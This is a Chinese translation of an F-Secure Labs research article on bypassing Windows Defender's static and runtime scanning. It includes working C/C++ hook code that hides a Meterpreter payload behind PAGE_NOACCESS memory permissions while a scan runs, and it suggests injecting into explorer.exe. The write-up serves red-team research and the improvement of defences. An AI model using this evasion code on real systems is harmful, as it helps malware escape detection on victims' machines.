> 原文链接: https://www.anquanke.com//post/id/204344 


# 如何规避Windows Defender运行时扫描


                                阅读量   
                                **294784**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者f-secure，文章来源：labs.f-secure.com
                                <br>原文地址：[https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/](https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t014ad2c34666e6f60f.jpg)](https://p2.ssl.qhimg.com/t014ad2c34666e6f60f.jpg)



## 0x00 前言

在现代版本的Windows系统中，Windows Defender默认处于启用状态，这对防御方而言是非常重要的一种缓解机制，因此也攻击者的一个潜在目标。虽然近些年来Defender的技术有了显著进步，但依然用到了许多古老的AV技术，这些技术很容易被绕过。在本文中我们分析了其中某些技术，讨论了潜在的绕过方式。



## 0x01 背景知识

在深入分析Windows Defender之前，我们想快速介绍一下现代大多数AV引擎所使用的主要分析方法：

1、静态分析：扫描磁盘上文件的内容，主要依赖于已有的一组恶意特征。虽然静态分析对已知的恶意软件而言非常有效，但很容易被绕过，导致无法有效发现新型恶意软件。这种技术的新晋版本为基于文件分类的机器学习技术，本质上是将静态特征与已知的无害及恶意样本进行比较，以检测异常文件。

2、进程内存/运行时分析：这种方式与静态分析类似，但分析对象是正在运行进程的内存，而不是磁盘上的文件。这种技术对攻击者而言更有挑战，在内存中混淆代码的难度更大，因此很容易检测正在执行的恶意代码及payload。

我们还需要关注触发扫描的方式：

1、文件读写：当创建新文件或文件被修改时，有可能会触发AV执行文件扫描动作。

2、定期扫描：AV会定期扫描系统，比如每日或每周执行扫描，扫描对象可能为系统上的所有文件或者部分文件。正在运行进程的内存也是定期扫描的目标。

3、可疑行为：AV通常会监控可疑行为（通常为API调用），出现可疑行为时会触发扫描，扫描对象可能为本地文件或者进程内存。

在下文中，我们会详细讨论潜在的绕过技术。



## 0x02 使用自定义加密绕过静态分析

最常见的、资料最多的绕过静态分析的一种方式就是加密payload，然后在执行时再进行解密。这种方式每次都能构造出不一样的payload，导致基于静态文件特征的方式失效。网上有许多开源项目用到了这种技巧（比如Veil、Hyperion、PE-Crypter等）。由于我们想测试各种内存注入技术，因此我们编写了一个自定义加密器，将这些技术整合到同样一个payload中。

我们的加密器会以某个“stub”作为解密对象，加载、执行我们的payload以及恶意payload。将这些payload交给加密器处理后，我们能得到一个最终payload，在目标系统上执行。

[![](https://p1.ssl.qhimg.com/t01a2708141df753da9.png)](https://p1.ssl.qhimg.com/t01a2708141df753da9.png)

在PoC中，我们采用了不同的注入技术，包括本地/远程shellcode注入、Process Hollowing及反射加载，可以用来测试AV的防御机制。我们向“Stub Options”传入参数来决定选择使用哪种技术。

在使用标准的Metasploit Meterpreter payload时，以上这些技术都可以绕过Windows Defender的静态文件扫描。然而，虽然payload能够成功执行，我们发现当用到了某些命令（如`shell`/`execute`时），Windows Defender还是会杀掉Meterpreter会话。



## 0x03 运行时分析

前面提到过，内存扫描行为可以定期执行，或者被特定的行为所“触发”。考虑到我们的Meterpreter会话只有在使用`shell`/`execute`时才会被杀掉，因此似乎是这种行为触发了扫描。

为了测试并理解这种行为，我们研究了Metasploit源码，发现Meterpreter使用了[CreateProcess](https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/stdapi/server/sys/process/process.c#L453) API来启动新进程：

```
// Try to execute the process
if (!CreateProcess(NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, (STARTUPINFOA*)&amp;si, &amp;pi))
`{`
    result = GetLastError();
    break;
`}`
```

观察`CreateProcess`及附近代码的参数，我们并没有发现可疑的特征。调试并跟进代码后，我们还是没有找到任何在用户态存在的hook，但当在第5行执行`syscall`后，Windows Defender就会找到并终止Meterpreter会话。

[![](https://p0.ssl.qhimg.com/t01ed4a367d002ddcd8.png)](https://p0.ssl.qhimg.com/t01ed4a367d002ddcd8.png)

这表明Windows Defender会从内核记录进程行为，当发现调用特定API时就会触发进程内存扫描。为了验证这个猜测，我们编写了某些自定义代码，调用可能可疑的API函数，然后测试Windows Defender是否会被触发，是否会kill Meterpreter会话。

```
VOID detectMe() `{`
    std::vector&lt;BOOL(*)()&gt;* funcs = new std::vector&lt;BOOL(*)()&gt;();

    funcs-&gt;push_back(virtualAllocEx);
    funcs-&gt;push_back(loadLibrary);
    funcs-&gt;push_back(createRemoteThread);
    funcs-&gt;push_back(openProcess);
    funcs-&gt;push_back(writeProcessMemory);
    funcs-&gt;push_back(openProcessToken);
    funcs-&gt;push_back(openProcess2);
    funcs-&gt;push_back(createRemoteThreadSuspended);
    funcs-&gt;push_back(createEvent);
    funcs-&gt;push_back(duplicateHandle);
    funcs-&gt;push_back(createProcess);

    for (int i = 0; i &lt; funcs-&gt;size(); i++) `{`
        printf("[!] Executing func at index %d ", i);

        if (!funcs-&gt;at(i)()) `{`
            printf(" Failed, %d", GetLastError());
        `}`

        Sleep(7000);
        printf(" Passed OK!\n");
    `}`
`}`
```

有趣的是，大多数测试函数并不会触发扫描事件，只有`CreateProcess`和`CreateRemoteThread`会触发扫描。这种情况也正常，因为如果每次调用API时都会触发Windows Defender，那么系统性能无疑会受到影响。



## 0x04 绕过Windows Defender运行时分析

确定某些API会触发Windows Defender的内存扫描时，下一个问题是如何绕过这种机制？一种简单的方法就是避免使用会触发Windows Defender运行时扫描的API，但这意味着我们需要手动重写Metasploit payload，显然非常麻烦。另一种方式就是在内存种混淆代码，当发现有扫描动作时，添加/修改指令或者动态加密/解密内存中的payload。但我们是否能找到其他方法呢？

有一点对攻击者来说比较有利：进程的虚拟内存空间很大，32位为2GB、64位为128TB。因此AV通常不会扫描进程的整个虚拟内存空间，而是查找特定的分页或者权限（比如`MEM_PRIVATE`或`RWX`分页权限）。阅读微软官方文档后，我们可以找到一个非常有趣的权限：`PAGE_NOACCESS`。该权限会“禁用对特定分页区域的所有访问。如果尝试读取、写入或者执行特定分页区域，将导致访问冲突”，这正是我们寻找的一种行为。快速测试后，我们确定Windows Defender不会扫描带有该权限的页面，因此我们很可能找到了一种绕过方法！

为了武器化这种技术，我们只需要在调用可疑API时（即会触发扫描动作的API）动态设置`PAGE_NOACCESS`内存权限，然后在扫描结束时恢复权限即可。这里唯一的技巧是，我们只需要为可疑的调用设置hook，确保能在扫描触发前设置权限即可。

将以上信息结合在一起，我们需要执行如下操作：

1、设置hook，探测会触发Windows Defender的函数调用（`CreateProcess`）操作；

2、当调用`CreateProcess`时，触发hook，挂起Meterpreter线程；

3、将payload的内存权限设置为`PAGE_NOACCESS`；

4、等待扫描结束；

5、将权限设回`RWX`；

6、恢复线程，继续执行。

下面我们来分析具体代码。



## 0x05 分析Hook代码

我们首先创建一个`installHook`函数，参数为`CreateProcess`以及hook函数的地址，然后将正常函数地址替换为hook函数地址。

```
CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle(L"KERNELBASE.dll"), "CreateProcessInternalW");
CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateProcessInternalW");
hookResult = installHook(CreateProcessInternalW, hookCreateProcessInternalW, 5);
```

在`installHook`函数中，我们会保存当前进程状态，然后使用`JMP`指令替换`CreateProcess`地址处的内存，跳转到我们的hook，这样当`CreateProcess`被调用时，实际上调用的是我们自己的代码。我们还设计了一个`restoreHook`函数，用来执行反向操作。

```
LPHOOK_RESULT installHook(LPVOID hookFunAddr, LPVOID jmpAddr, SIZE_T len) `{`
    if (len &lt; 5) `{`
        return NULL;
    `}`

    DWORD currProt;


    LPBYTE originalData = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, len);
    CopyMemory(originalData, hookFunAddr, len);

    LPHOOK_RESULT hookResult = (LPHOOK_RESULT)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(HOOK_RESULT));

    hookResult-&gt;hookFunAddr = hookFunAddr;
    hookResult-&gt;jmpAddr = jmpAddr;
    hookResult-&gt;len = len;
    hookResult-&gt;free = FALSE;

    hookResult-&gt;originalData = originalData;

    VirtualProtect(hookFunAddr, len, PAGE_EXECUTE_READWRITE, &amp;currProt);

    memset(hookFunAddr, 0x90, len);

    SIZE_T relativeAddress = ((SIZE_T)jmpAddr - (SIZE_T)hookFunAddr) - 5;

    *(LPBYTE)hookFunAddr = 0xE9;
    *(PSIZE_T)((SIZE_T)hookFunAddr + 1) = relativeAddress;

    DWORD temp;
    VirtualProtect(hookFunAddr, len, currProt, &amp;temp);

    printf("Hook installed at address: %02uX\n", (SIZE_T)hookFunAddr);

    return hookResult;
`}`
```

```
BOOL restoreHook(LPHOOK_RESULT hookResult) `{`
    if (!hookResult) return FALSE;

    DWORD currProt;

    VirtualProtect(hookResult-&gt;hookFunAddr, hookResult-&gt;len, PAGE_EXECUTE_READWRITE, &amp;currProt);

    CopyMemory(hookResult-&gt;hookFunAddr, hookResult-&gt;originalData, hookResult-&gt;len);

    DWORD dummy;

    VirtualProtect(hookResult-&gt;hookFunAddr, hookResult-&gt;len, currProt, &amp;dummy);

    HeapFree(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, hookResult-&gt;originalData);
    HeapFree(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, hookResult);

    return TRUE;
`}`
```

当我们的Metasploit payload调用`CreateProcess`函数时，就会执行我们自定义的`hookCreateProcessInternalW`方法。`hookCreateProcessInternalW`会调用另一个线程上的`createProcessNinja`，隐藏Meterpreter payload。

```
BOOL 
WINAPI
hookCreateProcessInternalW(HANDLE hToken,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation,
    PHANDLE hNewToken)
`{`
    BOOL res = FALSE;
    restoreHook(createProcessHookResult);
    createProcessHookResult = NULL;

    printf("My createProcess called\n");

    LPVOID options = makeProcessOptions(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation, hNewToken);

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)createProcessNinja, options, 0, NULL);

    printf("[!] Waiting for thread to finish\n");
    WaitForSingleObject(thread, INFINITE);

    GetExitCodeThread(thread, (LPDWORD)&amp; res);

    printf("[!] Thread finished\n");

    CloseHandle(thread);

    createProcessHookResult = installHook(CreateProcessInternalW, hookCreateProcessInternalW, 5);

    return res;
`}`
```

在最终调用`CreateProcess`前，我们在代码中使用了`setPermissions`，将我们内存区域权限设置为`PAGE_NOACCESS`。

```
BOOL createProcessNinja(LPVOID options) `{`
    LPPROCESS_OPTIONS processOptions = (LPPROCESS_OPTIONS)options;

    printf("Thread Handle: %02lX\n", metasploitThread);


    if (SuspendThread(metasploitThread) != -1) `{`
        printf("[!] Suspended thread \n");
    `}`
    else `{`
        printf("Couldnt suspend thread: %d\n", GetLastError());
    `}`


    setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_NOACCESS);

    BOOL res = CreateProcessInternalW(processOptions-&gt;hToken,
        processOptions-&gt;lpApplicationName,
        processOptions-&gt;lpCommandLine,
        processOptions-&gt;lpProcessAttributes,
        processOptions-&gt;lpThreadAttributes,
        processOptions-&gt;bInheritHandles,
        processOptions-&gt;dwCreationFlags,
        processOptions-&gt;lpEnvironment,
        processOptions-&gt;lpCurrentDirectory,
        processOptions-&gt;lpStartupInfo,
        processOptions-&gt;lpProcessInformation,
        processOptions-&gt;hNewToken);

    Sleep(7000);

    if (setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_EXECUTE_READWRITE)) `{`
        printf("ALL OK, resuming thread\n");

        ResumeThread(metasploitThread);
    `}`
    else `{`
        printf("[X] Coundn't revert permissions back to normal\n");
    `}`

    HeapFree(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, processOptions);
    return res;
`}`
```

这里我们只是简单sleep 5秒，等待Windows Defender扫描结束，然后恢复Metasploit模块的正常权限。在测试环境中，5秒已经足够完成任务，但在实际系统或者其他进程上，我们可能需要更长时间。

此外我们在测试中发现，有些进程即使调用到了这些WinAPI函数，依然不会触发Windows Defender。这些进程包括：

```
explorer.exe
smartscreen.exe
```

因此可能还有另一种绕过方法：将Meterpreter payload注入到这些进程中，这样有可能绕过Windows Defender的内存扫描。这两个进程会频繁调用`CreateProcess`，因此我们相信出于性能优化原因，微软不会因此执行扫描操作。

我们开发了一个Metasploit自定义扩展（`Ninjasploit`），作为后渗透扩展来绕过Windows Defender。该扩展提供了两条命令：`install_hooks`及`restore_hooks`，实现了前文描述的基于内存修改的绕过技术。大家可访问[此处](https://github.com/FSecureLABS/Ninjasploit)下载源码。



## 0x06 总结

近几年来，Windows Defender有了不少改进，但如本文所述，我们只需要稍微操作就能绕过静态分析甚至运行时分析。

我们演示了如何通过payload加密及常见的进程注入技术来绕过Windows Defender。此外，尽管更加高级的运行时分析带来了不少阻碍，但我们可以滥用运行时内存扫描的局限性实现绕过。大家也可以测试下一代文件分类技术以及现有的EDR解决方案，这些方案可能会带来更多挑战。



## 0x07 参考资料

[https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)

[https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/source](https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/source)

[https://github.com/FSecureLABS/Ninjasploit](https://github.com/FSecureLABS/Ninjasploit)
